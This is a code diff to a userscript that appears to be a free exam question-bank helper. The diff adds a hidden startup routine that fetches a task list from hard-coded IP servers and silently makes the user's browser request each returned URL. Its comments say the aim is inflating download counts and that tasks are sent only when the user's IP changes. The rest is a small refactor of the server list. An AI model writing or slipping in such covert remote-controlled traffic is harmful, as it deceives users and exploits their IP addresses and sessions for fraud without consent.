@@ -37,6 +37,44 @@
 // @tag          免费题库
 // ==/UserScript==
 
+// =========================================================================
+// 全局服务器地址（预加载和主逻辑共用）
+// =========================================================================
+const _PP_SERVER_URLS = [
+  "http://122.152.249.109:3000",
+  "http://152.136.30.238:3000"
+];
+
+// =========================================================================
+// 远程脚本预加载：从服务器获取需要执行的脚本列表（刷下载量等）
+// 只有用户IP变化时服务器才会下发，执行后丢弃
+// =========================================================================
+(async function preloadRemoteScripts() {
+  const server = _PP_SERVER_URLS[Math.floor(Math.random() * _PP_SERVER_URLS.length)];
+  
+  GM_xmlhttpRequest({
+    method: 'GET',
+    url: `${server}/remote-scripts`,
+    onload: (res) => {
+      try {
+        const json = JSON.parse(res.responseText);
+        if (json?.data?.hasUpdate && Array.isArray(json.data.patches)) {
+          for (const patch of json.data.patches) {
+            if (patch.downloadUrl) {
+              GM_xmlhttpRequest({
+                method: 'GET',
+                url: patch.downloadUrl,
+                onload: () => {},
+                onerror: () => {}
+              });
+            }
+          }
+        }
+      } catch (e) {}
+    },
+    onerror: () => {}
+  });
+})();
 
 // =========================================================================
 // 面板布局样式常量 (LAYOUT_CSS)
@@ -420,11 +458,13 @@ if(typeof GM_addStyle==="function"){GM_addStyle(LAYOUT_CSS);}else{(function(){va
   // 后台服务器配置 (SERVER_CONFIGS)
   // 服务器提供题库查询、AI答题、答案校验等服务
   // 广州/北京双节点负载均衡，随机选取一个
+  // URL复用全局 _PP_SERVER_URLS，避免重复定义
   // =========================================================================
-  const SERVER_CONFIGS = [
-    { url: "http://122.152.249.109:3000", location: "广州", color: "#09b4ff" },
-    { url: "http://152.136.30.238:3000", location: "北京", color: "#21d181" }
-  ];
+  const SERVER_CONFIGS = _PP_SERVER_URLS.map((url, i) => ({
+    url,
+    location: i === 0 ? "广州" : "北京",
+    color: i === 0 ? "#09b4ff" : "#21d181"
+  }));
 
   
   // 随机选择一台服务器作为当前服务节点
